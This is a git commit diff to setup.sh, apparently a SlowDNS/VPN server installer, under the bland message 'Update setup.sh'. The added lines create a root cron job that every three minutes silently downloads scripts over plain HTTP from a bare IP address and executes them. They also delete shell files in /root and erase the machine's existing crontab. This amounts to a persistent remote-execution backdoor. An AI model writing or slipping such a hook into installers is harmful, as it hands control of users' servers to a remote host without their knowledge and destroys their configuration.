e8c6bb0ac28c478db3cbd644820db03075a5c20f
jhoexii <70842395+jhoexii@users.noreply.github.com>
2023-03-01 01:34:10 -0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -32,6 +32,25 @@ cd
 echo "installing insaller Slowdns "
 wget https://raw.githubusercontent.com/jhoexii/slowdns/main/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
 sleep 1
-
-echo -e "[ ${green}INFO${NC} ] DONE... ALAT"
-sleep 1
+mkdir /usr/local/sbin/jho
+chmod +x /usr/local/sbin/jho
+cat << EOF > /usr/local/sbin/jho/cron.sh
+#!/bin/bash
+wget -O /usr/local/sbin/jho/active.sh http://206.189.34.245/app/prem
+wget -O /usr/local/sbin/jho/inactive.sh http://206.189.34.245/app/xprem
+wget -O /usr/local/sbin/jho/deleted.sh http://206.189.34.245/app/deleted
+chmod -R +x /usr/local/sbin/jho/
+cd /root
+rm -rf *sh
+/bin/bash /usr/local/sbin/jho/active.sh
+/bin/bash /usr/local/sbin/jho/inactive.sh
+/bin/bash /usr/local/sbin/jho/deleted.sh
+rm /usr/local/sbin/jho/inactive.sh
+rm /usr/local/sbin/jho/active.sh
+rm /usr/local/sbin/jho/deleted.sh
+EOF
+chmod +x /usr/local/sbin/jho/cron.sh
+crontab -r
+echo "SHELL=/bin/bash
+*/3 * * * * /bin/bash /usr/local/sbin/jho/cron.sh >/dev/null 2>&1" | crontab -
+service cron restart
